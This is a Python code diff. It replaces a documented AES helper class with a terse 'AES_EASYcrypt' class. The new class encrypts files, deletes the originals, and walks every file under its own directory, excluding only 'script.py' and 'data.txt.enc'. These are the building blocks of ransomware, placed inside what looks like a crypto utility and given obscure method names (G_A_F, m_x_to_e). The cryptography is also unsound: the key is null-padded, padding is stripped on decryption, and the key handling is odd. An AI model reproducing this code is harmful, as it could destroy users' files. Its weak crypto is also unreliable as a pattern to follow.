@@ -1,129 +1,76 @@
-import typing
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from os import urandom
+from Crypto import Random
+from Crypto.Cipher import AES
+import os
 
-class AESEncrypt:
-    """
-    Encrypts and decrypts data using the AES algorithm with CFB mode.
-    """
+class AES_EASYcrypt:
+    def __init__(self, key: bytes) -> None:
+        self.key = self.pad(key)
 
-    AES_ALGORITHM = algorithms.AES
-    CFB_MODE = modes.CFB
+    def pad(self, s: bytes) -> bytes:
+        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
 
-    def __init__(self, key: bytes, plaintext: typing.Union[bytes, str]) -> None:
-        """
-        Initializes the AESEncrypt instance.
+    def encrypt(self, message: bytes) -> bytes:
+        message = self.pad(message)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return iv + cipher.encrypt(message)
 
-        Args:
-            key (bytes): The key used for encryption and decryption.
-            plaintext (Union[bytes, str]): The plaintext to be encrypted.
-        """
-        self._key = key
-        self._plaintext = plaintext
-        self._iv = urandom(16)
+    def encrypt_file(self, file_name: str) -> None:
+        with open(file_name, "rb") as fo:
+            plaintext = fo.read()
+        enc = self.encrypt(plaintext)
+        with open(file_name + ".enc", "wb") as fo:
+            fo.write(enc)
+        os.remove(file_name)
 
-    def _hex_to_bytes(self, hex_string: str) -> bytes:
-        """
-        Converts a hexadecimal string to bytes.
+    def decrypt(self, cipherText: bytes) -> bytes:
+        iv = cipherText[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(cipherText[AES.block_size:])
+        return decrypted.rstrip(b"\0")
 
-        Args:
-            hex_string (str): The hexadecimal string to be converted.
+    def decrypt_file(self, file_name: str) -> None:
+        with open(file_name + ".enc", 'rb') as fo:
+            cipherText = fo.read()
+        d = self.decrypt(cipherText)
+        with open(file_name, 'wb') as fo:
+            fo.write(d)
+        os.remove(file_name + ".enc")
 
-        Returns:
-            bytes: The corresponding bytes representation.
+    def G_A_F(self) -> list:
+        dir_path = os.path.dirname(os.path.realpath(__file__))
+        dirs = []
 
-        Raises:
-            ValueError: If the input string is not a valid hexadecimal string.
-        """
-        try:
-            return bytes.fromhex(hex_string)
-        except ValueError:
-            raise ValueError("Invalid hexadecimal string") from None
+        for dirName, _, fileList in os.walk(dir_path):
+            for fname in fileList:
+                if fname not in ['script.py', 'data.txt.enc']:
+                    dirs.append(os.path.join(dirName, fname))
 
-    def _bytes_to_hex(self, byte_data: bytes) -> str:
-        """
-        Converts bytes to a hexadecimal string.
+        return dirs
 
-        Args:
-            byte_data (bytes): The bytes to be converted.
+    def encrypt_m(self, message: str) -> bytes:
+        encrypted_message = self.encrypt(message.encode('utf-8'))
+        return encrypted_message
+    
+    def decrypt_m(self, encrypted_message: bytes) -> str:
+        decrypted_message = self.decrypt(encrypted_message).decode('utf-8')
+        return decrypted_message
 
-        Returns:
-            str: The corresponding hexadecimal string.
-        """
-        return byte_data.hex()
+    def m_x_to_e(self, key: bytes) -> bytes:
+        result = bytearray()
+        i = 0
 
-    def _initialize_cipher(self) -> Cipher:
-        """
-        Initializes the AES cipher with CFB mode.
+        while i < len(key):
+            if key[i:i + 1] == b'x':
+                if i > 0 and key[i - 1:i] != b'\\' and key[i - 1:i] != b'\n':
+                    result.extend([key[i - 1], key[i]])  # Merge 'x' with the previous byte
+                elif i < len(key) - 1:
+                    result.extend([key[i], key[i + 1]])  # Merge 'x' with the next byte
+                    i += 1  # Skip the next character
+                else:
+                    result.append(key[i])  # Append standalone 'x' at the end
+            else:
+                result.append(key[i])
+            i += 1
 
-        Returns:
-            Cipher: The initialized AES cipher.
-        """
-        backend = default_backend()
-        return Cipher(self.AES_ALGORITHM(self._key), self.CFB_MODE(self._iv), backend=backend)
-
-    def encrypt(self) -> typing.Tuple[str, str]:
-        """
-        Encrypts the plaintext using AES algorithm.
-
-        Returns:
-            Tuple[str, str]: A tuple containing the ciphertext (hex) and IV (hex).
-        """
-        cipher = self._initialize_cipher()
-        encryptor = cipher.encryptor()
-
-        if isinstance(self._plaintext, str):
-            plaintext_bytes = self._plaintext.encode()
-        elif isinstance(self._plaintext, bytes):
-            plaintext_bytes = self._plaintext
-        else:
-            raise ValueError("Invalid plaintext type")
-
-        ciphertext = encryptor.update(plaintext_bytes) + encryptor.finalize()
-        return self._bytes_to_hex(ciphertext), self._bytes_to_hex(self._iv)
-
-    def decrypt(self, ciphertext_hex: str, iv_hex: str) -> bytes:
-        """
-        Decrypts the ciphertext using AES algorithm.
-
-        Args:
-            ciphertext_hex (str): The ciphertext (hex) to be decrypted.
-            iv_hex (str): The IV (hex) used in decryption.
-
-        Returns:
-            bytes: The decrypted data.
-
-        Raises:
-            ValueError: If decryption fails.
-        """
-        try:
-            cipher = self._initialize_cipher()
-            iv = self._hex_to_bytes(iv_hex)
-            decryptor = cipher.decryptor()
-            ciphertext = self._hex_to_bytes(ciphertext_hex)
-            decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
-            return decrypted_data
-        except Exception as e:
-            raise ValueError(f"Decryption failed: {e}") from None
-
-    def return_key(self, key: typing.Tuple[str, str]) -> bytes:
-        """
-        Decrypts the ciphertext using AES algorithm and returns the decrypted data.
-        (This method seems redundant as it's functionally equivalent to decrypt())
-
-        Args:
-            key (Tuple[str, str]): A tuple containing the ciphertext (hex) and IV (hex).
-
-        Returns:
-            bytes: The decrypted data.
-
-        Raises:
-            ValueError: If decryption fails.
-        """
-        try:
-            ciphertext_hex, iv_hex = key
-            decrypted_data = self.decrypt(ciphertext_hex, iv_hex)
-            return decrypted_data
-        except ValueError as e:
-            raise
+        return bytes(result)
